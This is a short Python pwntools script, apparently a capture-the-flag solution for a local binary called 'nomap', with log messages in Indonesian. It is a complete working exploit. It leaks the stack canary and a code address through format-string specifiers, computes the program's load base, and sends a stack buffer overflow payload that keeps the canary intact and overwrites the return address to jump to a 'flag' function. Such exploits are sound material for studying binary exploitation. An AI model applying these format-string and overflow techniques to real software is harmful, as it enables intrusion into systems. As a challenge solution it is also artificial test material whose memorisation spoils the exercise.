from pwn import *
import re

elf = context.binary = ELF('./nomap')
p = process(elf.path)

# gdb.attach(p)

initial_output = p.clean(timeout=1).decode('latin-1', errors='ignore')
log.info("Output awal:\n" + initial_output)

p.sendline(b'%11$p')
leaked_data = p.recvline().strip().decode()
match = re.search(r'0x[0-9a-fA-F]+', leaked_data)
if not match:
    log.error("Gagal menemukan leak Canary pada output: " + leaked_data)
    exit(1)
canary = int(match.group(0), 16)
log.success(f'Canary: {hex(canary)}')

p.sendline(b'%21$p')
leaked_data = p.recvline().strip().decode()
match = re.search(r'0x[0-9a-fA-F]+', leaked_data)
if not match:
    log.error("Gagal menemukan leak PIE pada output: " + leaked_data)
    exit(1)
pie = int(match.group(0), 16)
log.success(f'Pie: {hex(pie)}')

aligned_leak = pie & 0xFFFFFFFFFFFFF000
offset = pie - aligned_leak
elf.address = pie - offset - 0x1000
log.success(f'PIE base: {hex(elf.address)}')

flag_func = elf.symbols['flag']

payload  = b'A' * 104
payload += p64(canary)
payload += b'A' * 8
payload += p64(flag_func)

p.sendline(b'exit')
p.sendline(payload)

final_output = p.clean(timeout=1).decode('latin-1', errors='ignore')
print(final_output)
